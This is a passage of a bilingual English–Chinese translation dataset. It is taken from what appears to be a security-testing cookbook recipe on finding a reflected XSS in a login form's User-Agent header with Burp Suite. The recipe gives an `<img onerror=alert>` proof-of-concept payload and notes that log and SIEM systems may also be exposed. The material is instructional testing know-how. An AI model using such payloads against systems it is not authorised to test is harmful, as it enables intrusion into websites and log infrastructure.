  type: TYPE_NORMAL
  zh: 在比较对话框中，选择右下角的“同步视图”复选框，寻找被高亮显示的差异。一些比较明显的东西，比如服务器的日期，肯定会有所不同。我们要找的是与我们注入的有效负载相关的差异。下一张截图展示了一个相关的差异。
- en: '![](assets/93226208-83cb-468a-8c9f-947335ef2de2.png)'
  id: totrans-195
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/93226208-83cb-468a-8c9f-947335ef2de2.png)'
- en: So, our payload in the User-Agent header got directly reflected by the server.
    This could mean that the header is vulnerable to XSS, so let's try it.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 所以，我们在 User-Agent 头部的负载被服务器直接反射了。这可能意味着该头部存在 XSS 漏洞，让我们来试试。
- en: Go back to the browser and send another login attempt, but this time intercept
    the request in Burp Suite.
  id: totrans-197
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 返回浏览器并发送另一个登录尝试，但这次在 Burp Suite 中拦截请求。
- en: 'Modify the User-Agent header by adding `&lt;img src=X onerror="alert(''XSS'')">`.
    The next screenshot shows an example:'
  id: totrans-198
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过添加`&lt;img src=X onerror="alert('XSS')">`来修改 User-Agent 头部。接下来的截图展示了一个示例：
- en: '![](assets/b09a4a51-b81f-484d-9c5d-53edb64af486.png)'
  id: totrans-199
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/b09a4a51-b81f-484d-9c5d-53edb64af486.png)'
- en: 'Submit the request, and the payload will execute as follows:'
  id: totrans-200
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 提交请求后，负载将按以下方式执行：
- en: '![](assets/c0ae1a0e-01fd-4ff4-833f-b7d050f31f10.png)'
  id: totrans-201
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/c0ae1a0e-01fd-4ff4-833f-b7d050f31f10.png)'
- en: How it works...
  id: totrans-202
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: In this recipe, we were testing for SQL Injection in a login form but noticed,
    by analyzing the server's responses, that the User-Agent header was being reflected
    and took that as an indicator of a possible XSS vulnerability. Then, we successfully
    exploited the XSS by appending an `&lt;IMG>` tag to the header.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个示例中，我们在登录表单中测试 SQL 注入，但通过分析服务器的响应，我们注意到 User-Agent 头部被反射回来了，这就作为了可能存在 XSS
    漏洞的指示。接着，我们成功地通过将`&lt;IMG>`标签添加到头部来利用了这个 XSS 漏洞。
- en: Header values, particularly User-Agent, are very commonly stored in application
    and web server logs, which causes payloads sent in such headers to not being processed
    directly  by the target application, but by SIEM (Security Information and Event
    Manager) systems and other log analyzers and aggregators, which may also be vulnerable.
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 头部值，尤其是 User-Agent，通常会存储在应用程序和 Web 服务器日志中，这导致通过这些头部发送的负载不会直接由目标应用程序处理，而是由 SIEM（安全信息和事件管理）系统以及其他日志分析器和聚合器处理，这些系统本身也可能存在漏洞。
